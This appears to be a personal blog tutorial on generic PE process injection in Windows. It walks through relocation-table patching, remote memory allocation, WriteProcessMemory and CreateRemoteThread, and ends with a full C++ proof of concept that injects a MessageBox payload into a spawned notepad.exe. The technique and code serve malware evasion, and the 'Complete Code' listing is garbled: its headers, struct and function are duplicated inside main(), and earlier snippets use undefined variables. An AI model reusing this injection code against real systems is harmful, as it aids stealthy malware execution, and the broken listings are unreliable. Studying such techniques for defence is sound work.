---
title: Generic Process Injection
date: 17-04-2023 12:00:00 -500
name: Terry-ngyx
featured-img: /assets/images/process_injection2.png
categories: []
tags: []
---
## Introduction
![Process Injection](/assets/images/process_injection2.png)

As a result of my journey to better understand process injection, I've compiled a comprehensive set of notes and insights that I hope will be valuable to anyone looking to explore this topic. In this article, I'll share my understanding of process injections, including the different types and methods of implementation. A lot of the code taken in this section is referenced from the writeup from iredteam with a couple of tweaks of my own.

## What's Process Injection

Process injection is a technique used by attackers to execute malicious code on a system under the guise of a legitimate process. This allows attackers to evade detection, escalate privileges, establish persistence, and carry out other malicious activities. The process injection technique typically involves the allocation of memory in a remote process, followed by the injection of malicious code into that allocated memory. The injected code is then executed by creating a remote thread within the targeted process, which allows the attacker to control the process and execute their code within its context. This technique can be used for a variety of malicious purposes, and is a common tactic used by malware creators to compromise systems and steal sensitive information.

## Caveats To Consider
Before we jump in, there are cavets to consider when carrying out process injection. An important consideration is whether the injected code is position independent. If the code is not position independent, it may require modification to ensure that all its dependencies work properly under the remote or target process. This can be accomplished by modifying the image relocations, which are located in the base relocation table of the injected code.

The base relocation table is a data directory that is located in the .reloc section of the Portable Executable (PE) file structure. It contains a list of entries, each of which specifies an absolute address that needs to be modified or "rebased" if the PE file is not loaded at its preferred base address. When the PE file is loaded into memory, the operating system uses the base relocation table to calculate the actual addresses of the code and data in the file, based on the preferred base address and the offsets specified in the relocation entries. For a detailed explanation of the base relocation table, refer to the following link: https://0xrick.github.io/win-internals/pe7/.

If the injected code is not loaded at its preferred base address in the remote process, the base relocation table entries will need to be modified to reflect the correct addresses. This can be done by iterating through the relocation entries and applying the appropriate delta value to each absolute address. The delta value is calculated based on the difference between the preferred base address and the actual base address of the remote process.

In summary, image relocations are an important consideration when carrying out process injection, and modifying the base relocation table entries may be necessary to ensure that the injected code runs properly in the target process.

## Detailed Overview
We will now go over the steps to carry out generic process injection listed below. For simplicity, we will refer to the code that is to be injected as the malicious code and the remote process as the target process.
\
&nbsp; 
&emsp;[1. Obtaining malicious code](#obtaining-malicious-code)
\
&nbsp;
&emsp;[2. Locating the target process](#locating-the-target-process)
\
&nbsp;
&emsp;[3. Allocating memory in the target process](#allocating-memory-in-the-target-process)
\
&nbsp;
&emsp;[4. Modifying malicious code for compatibility](#modifying-malicious-code-for-compatibility)
\
&nbsp;
&emsp;[5. Injecting malicious code](#injecting-malicious-code)
\
&nbsp;
&emsp;[6. Obtaining entry point of malicious code](#obtaining-entry-point-of-malicious-code)
\
&nbsp;
&emsp;[7. Executing malicious code](#executing-malicious-code)


## Obtaining malicious code
For this proof of concept, we will be creating a loader program that will inject itself into the target process. The loader will contain a function acting as our malicious code; where the function will also be the entry point of the remote thread.

Let's examine the loader code below, which contains the first step of our process injection. First, the loader program allocates memory for itself. Then, it copies itself into the allocated memory. This is done so that we have access to a copy of the code that we can modify in memory to make it compatible with the target process.
```cpp
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <string>  
#include <typeinfo>

//Function which will be the entry point to the remote thread
int InjectionEntryPoint() {
	MessageBoxA(NULL, NULL, NULL, NULL);
	return 0;
}

int main() {
  //Obtain the handle of the current process. GetModuleHandle returns a handle containing a pointer to the specified process. In this case, we have passed the NULL parameter. Therefor, it returns the pointer pointing to the image base of the current process.
	HMODULE imageBase = GetModuleHandle(NULL);
  
  //Reading headers to obtain sizeOfImage
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
	DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
  
	//Allocating memory locally
	LPVOID localImage = VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//Copying the current process into the allocated memory
	memcpy(localImage, imageBase, sizeOfImage);
	return 0;
}
```

## Locating the target process
For the next step, we need to locate the target process. This can be easily done by using the OpenProcess Win32 API to obtain a handle for the target process. However, it is important to note that the target process ID (PID) needs to be specified explicitly when using the API. Currently, the PID 16248 corresponds to a notepad.exe process running on my system.

```cpp
HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 16248);
```

## Allocating memory in the target process
Using the handle for the target process, we can now allocate memory in the target process through the VirtualAllocEx Win32 API. The size of the allocated memory region should fit the sizeOfImage of our loader program obtained from the first step.

```cpp
LPVOID targetImage = VirtualAllocEx(targetProcess, NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

## Modifying malicious code for compatibility
Now that we have allocated memory in the target process, we have a memory region where we can inject our malicious code. But wait! First, we need to ensure that the malicious code is compatible with the target process. As mentioned previously, as a result of injecting code into the target process, the malicious code will possess a new ImageBase, since it will sit in the new memory region in the target process. Therefore, all the addresses in the code that are dependent on the old ImageBase will need to be modified. This is done by patching the BaseRelocationTable of the malicious code, i.e., the copy of the current process obtained in the first step. Note that the new ImageBase of the malicious code will be the starting address of the newly allocated memory that was allocated through the VirtualAllocEx API in the previous section.

### Patching BaseRelocationTable

The relative virtual address (RVA) of the relocation table can be obtained by accessing the 5th element of the DataDirectory located in the OptionalHeader of the PE structure. The RVA of the relocation table obtained in this section belongs to that of the current loader process. By adding the RVA obtained to the address of the local copy of our loader program, we now have the address of the relocation table. Typecasting the address to the IMAGE_BASE_RELOCATION struct allows us to enumerate the entries more easily.

```cpp
IMAGE_DATA_DIRECTORY dataDirectory = (IMAGE_DATA_DIRECTORY)ntHeader->OptionalHeader.DataDirectory[5];
PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage+dataDirectory.VirtualAddress);
```

The relocation table is composed of relocation blocks, where each block is made up of relocation entries. Each relocation block will first contain the Page RVA, followed by the Block Size, and then the entries.

Therefore, we will use nested loops to iterate through each entry. The outer loop will iterate through the relocation blocks, and the inner loop will iterate through the relocation entries of each relocation block. The outer loop uses a while loop and will stop once the zero padding is reached. The inner loop uses a for loop, which stops when all the relocation entries have been accessed. This is done by calculating the number of relocation entries in the current block as shown below.

```cpp
while (relocationTable->SizeOfBlock)
{
	DWORD relocationEntriesCount = (imageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
	for (short i = 0; i < relocationEntriesCount; i++)
		{
            baseRelocationEntry++;
			continue;
		}
imageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD)imageBaseRelocation + imageBaseRelocation->SizeOfBlock);
}
```

Each relocation entry contains the type of relocation and an offset. The offset is relative to the Page RVA. When added together, along with the old Image base, we can access the absolute addresses which require patching. 

$$Location ofAbsoluteAddress = PageRVA+Offset+OldImageBase$$

Before we start patching the relocation table, we can utilise something called the Delta. Essentially, the Delta is just the difference between the new ImageBase in the remote process and the old ImageBase of our loader program. 

$$Delta = New ImageBase - Old ImageBase$$

Now that we can iterate through the relocation entries and have obtained the delta, we can begin patching the absolute addresses. To do this, we define a pointer to the absolute address of the relocation entry and add the delta value to it. The code for patching the addresses will now look like the following:

```cpp
while (relocationTable->SizeOfBlock)
{
	DWORD relocationEntriesCount = (imageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);

//Initialising a pointer to point to the first relocation entry
PBASE_RELOCATION_ENTRY baseRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD)imageBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
	for (short i = 0; i < relocationEntriesCount; i++)
		{
			DWORD buffer = 0;
			//Obtaining the pointer to the absolute address that needs to be patched
			PDWORD_PTR patchAddress = (DWORD)localImage + imageBaseRelocation->VirtualAddress + baseRelocationEntry->Offset;
      //Patching the address
			*patchAddress += delta;
			//Using pointer arithmetic to get the next relocation entry
			baseRelocationEntry++;
		}
imageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD)imageBaseRelocation + imageBaseRelocation->SizeOfBlock);
}
```

### Deriving Delta (Extra)
In this section, we will go through the proof of concept for deriving Delta and the usage of Delta that we have used to patch the absolute addresses of the relocation entries. To understand how we derive Delta, we must first understand the concept of absolute addresses. An absolute address is simply the sum of the RVA with the ImageBase of a process.

$$Absolute Address = RVA + ImageBase$$

The reason why we need to patch the absolute addresses in the relocation table is that it is using the old ImageBase, which is the ImageBase of our loader program. Following the previous explanation of absolute addresses, the absolute addresses that require patching are given by the following equation: -

$$Old Absolute Address = RVA + Old ImageBase$$

Rearranging the equation would give us: -

$$RVA = OldAbsolute Address - Old ImageBase$$

What we actually want, is to have the absolute address use the new ImageBase of our target process. For now, we will call this the NewAbsoluteAddress. Again, absolute addresses are given by the sum of the RVA and the ImageBase. Obtaining the NewAbsoluteAddress is as simple as adding the RVA to the NewImageBase.

$$New Absolute Address = RVA + New ImageBase$$

These equations can be summarised in the following by combining the second and third equations using simple arithmetic. The common term for the difference between the new and old ImageBase is Delta. To patch the relocation entries, we would just need to add Delta to the absolute address. 

$$New Absolute Address = Absolute Address + (New ImageBase - Old ImageBase)$$
$$New Absolute Address = Absolute Address + Delta$$

## Injecting malicious code
Now that we have the patched code, we can write/inject it into the target process by using the WriteProcessMemory Win32 API.

```cpp
WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
```

## Obtaining entry point of malicious code
Next, we can utilise the delta variable to determine the targetEntryPoint. The targetEntryPoint represents the absolute memory address of the function we intend to execute within the context of the target process.
```cpp
DWORD_PTR targetEntryPoint = (DWORD_PTR)InjectionEntryPoint + delta
```

## Executing malicious code
The last step is to executed the injected code. To execute the injected function within the target process, we can create a remote thread by invoking the CreateRemoteThread function and passing in the targetEntryPoint. This will allow our code to run within the context of the target process, enabling us to interact with its memory and resources as needed.
```cpp
CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE) targetEntryPoint, NULL, 0, NULL);
```

### Complete Code (Extra)
Below contains the complete code for the Process Injection PoC. I have made a few tweaks to tidy the code  and add a few functionalities such as spawning our own notepad.exe process and specifying the module name in the messagebox created in the injection function (similar to the iredteam PoC). However, note that the moduleName variable was initialised using VirtualAllocEx to ensure that the remote thread had access to the variable.

```cpp
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <iostream>

using namespace std;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint(LPSTR moduleName)
{
	GetModuleFileNameA(NULL, moduleName, 128);
	MessageBoxA(NULL, moduleName, "Hello world from: ", NULL);
	return 0;
}

int main()
{

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <iostream>

using namespace std;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint(LPSTR moduleName)
{
	GetModuleFileNameA(NULL, moduleName, 128);
	MessageBoxA(NULL, moduleName, "Hello world from: ", NULL);
	return 0;
}

int main()
{

	// create destination process - this is the process to be hollowed out
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	PULONG returnLenght = 0;

	CreateProcessA((LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);

	// Get current image's base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Open the target process - this is process we will be injecting this PE into
	//HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 30632);
	HANDLE targetProcess = pi->hProcess;

	// Allote a new memory block in the target process. This is where we will be injecting this PE
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	LPVOID arg = VirtualAllocEx(targetProcess, NULL, 128, (MEM_COMMIT | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR delta = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	//Carry out base relocation patching if the relocation table exists
	IMAGE_DATA_DIRECTORY dataDirectory = (IMAGE_DATA_DIRECTORY)ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (dataDirectory.VirtualAddress != 0) {
		PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + dataDirectory.VirtualAddress);
		DWORD relocationTableSize = dataDirectory.Size;
		DWORD relocationEntriesCount = 0;
		PDWORD_PTR patchedAddress;
		DWORD relocationOffset = 0;
		PBASE_RELOCATION_ENTRY relocationRVA = NULL;

		while (relocationTable->SizeOfBlock > 0)
		{
			relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
			relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

			for (short i = 0; i < relocationEntriesCount; i++)
			{
				if (relocationRVA[i].Offset)
				{
					patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
					*patchedAddress += delta;
				}
			}
			relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
		}

	}
	// Write the relocated localImage into the target process
	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	DWORD_PTR entryPoint = (DWORD_PTR)InjectionEntryPoint + delta;

	// Start the injected PE inside the target process
	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + delta), arg, 0, NULL);

	return 0;

}
```

## References
- [https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes](https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes)
- [https://0xrick.github.io/win-internals/pe7/](https://0xrick.github.io/win-internals/pe7/)
- [https://www.youtube.com/watch?v=Zl2nUJA00Yc&t=287s&ab_channel=MeetSEKTOR7](https://www.youtube.com/watch?v=Zl2nUJA00Yc&t=287s&ab_channel=MeetSEKTOR7)


<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-7CTE714YRJ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-7CTE714YRJ');
</script>
